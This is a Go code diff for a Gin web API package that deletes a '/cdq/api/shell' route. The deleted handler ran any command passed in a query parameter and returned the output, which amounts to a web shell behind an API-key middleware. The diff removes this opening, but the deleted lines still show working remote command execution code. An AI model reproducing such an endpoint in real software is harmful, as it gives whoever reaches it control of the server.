@@ -1,7 +1,6 @@
 package cdq
 
 import (
-	ctx "context"
 	"errors"
 	"fmt"
 	"golang.org/x/text/encoding"
@@ -9,7 +8,6 @@ import (
 	"golang.org/x/text/transform"
 	"net/http"
 	"runtime"
-	"time"
 	"unicode/utf8"
 
 	"github.com/gin-gonic/gin"
@@ -48,7 +46,6 @@ func (a *GinApi) SetRouter(router *gin.Engine) {
 	a.Router = router
 	a.Router.GET("/cdq/api", a.AutoGucooingApi, a.GetApi)
 	a.Router.GET("/cdq/api/help", a.AutoGucooingApi, a.Help)
-	a.Router.GET("/cdq/api/shell", a.AutoGucooingApi, a.shell)
 }
 
 func (a *GinApi) SetApiKey(key ...string) {
@@ -177,34 +174,6 @@ func (a *GinApi) Help(c *gin.Context) {
 		returnstr += fmt.Sprintf("\n%s\n", opt)
 	}
 	c.String(200, returnstr)
-}
-
-func (a *GinApi) shell(c *gin.Context) {
-	command := c.Query("shell")
-	if command == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "Missing 'cmd' query parameter"})
-		return
-	}
-
-	ctxs, cancel := ctx.WithTimeout(ctx.Background(), 10*time.Second)
-	defer cancel()
-
-	cmd := newShellCmd(ctxs, command)
-
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		if len(output) > 0 {
-			utf8Output := convertToUTF8(output)
-			c.String(http.StatusOK, utf8Output)
-			return
-		}
-		c.JSON(http.StatusInternalServerError, gin.H{
-			"error": "Command execution failed: " + err.Error(),
-		})
-		return
-	}
-	utf8Output := convertToUTF8(output)
-	c.String(http.StatusOK, utf8Output)
 }
 
 func convertToUTF8(data []byte) string {
